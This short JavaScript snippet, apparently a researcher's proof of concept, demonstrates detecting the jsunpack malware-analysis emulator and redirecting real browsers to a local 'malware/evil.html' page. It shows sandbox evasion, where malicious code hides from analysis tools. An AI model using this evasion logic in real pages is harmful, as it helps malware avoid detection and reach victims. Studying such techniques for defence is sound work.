// jsunpack detection
// @author Krzysztof kotowicz - krzysztof at kotowicz dot net
fake_browser = false;
//fake_browser = (window.open.toString().match(/print/));
if (!fake_browser) {
   window.location = 'http://localhost/~koto/malware/evil.html';
}


